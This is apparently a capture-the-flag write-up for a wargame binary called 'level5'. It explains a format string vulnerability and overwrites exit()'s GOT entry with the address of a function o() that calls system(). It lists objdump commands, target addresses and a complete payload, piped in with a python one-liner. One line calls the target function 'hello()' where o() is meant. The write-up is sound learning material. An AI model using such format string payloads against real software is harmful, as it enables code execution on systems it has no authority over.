This elf still use unprotected printf, but this time their is no comparaison.
But we spot a fct <o> with our beloved call to system(), but it is never called...
Also mind that <n> calls exit(), so never returns !
We can see taht our string start at stack position 4, and check the adresses of functions exit and o with
```
objdump -R level5
objdump -t level5 | grep o
```
We want to replace the address of exit() by that of hello() in the GOT
08049838 -> exit()
080484a4 -> o()
so 
0x84a4 (33956) -> 0x08049838
0x0804 (2052)-> 0x0804983a

`\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn`

```
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn" > /tmp/exploit'
cat /tmp/exploit - | ./level5
```
